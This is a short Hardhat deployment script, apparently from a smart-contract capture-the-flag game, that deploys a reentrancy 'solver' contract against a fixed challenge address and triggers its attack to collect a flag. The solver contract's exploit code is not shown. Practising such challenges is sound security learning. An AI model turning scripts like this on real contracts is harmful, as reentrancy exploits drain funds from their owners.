import { HardhatRuntimeEnvironment } from "hardhat/types";
import { DeployFunction } from "hardhat-deploy/types";

const deployS2Challenge5: DeployFunction = async function (hre: HardhatRuntimeEnvironment) {
  const { deployer } = await hre.getNamedAccounts();
  const { deploy } = hre.deployments;
  const { ethers } = hre;

  const challengeAddress = "0xB76AdFe9a791367A8fCBC2FDa44cB1a2c39D8F59";

  console.log("-------------------------------------------------------");
  console.log("🚀 Deploying Reentrancy Solver for Challenge 5...");

  const deployment = await deploy("S1Challenge5Solver", {
    from: deployer,
    args: [challengeAddress],
    log: true,
    autoMine: true,
  });

  const solver = await ethers.getContractAt("S1Challenge5Solver", deployment.address);

  console.log("🛰  Executing reentrancy attack...");

  try {
    // We need a high gas limit because we are stacking 10 calls deep
    const tx = await solver.attack({
      gasLimit: 600000,
    });
    console.log("⏳ Waiting for recursive mint...");
    await tx.wait();
    console.log("✨ SUCCESS! Flag #9 (10 Points) is yours.");
  } catch (error: any) {
    console.log("❌ Attack failed!");
    console.error("Reason:", error.reason || error.message);
  }
};

export default deployS2Challenge5;
deployS2Challenge5.tags = ["S1Challenge5"];
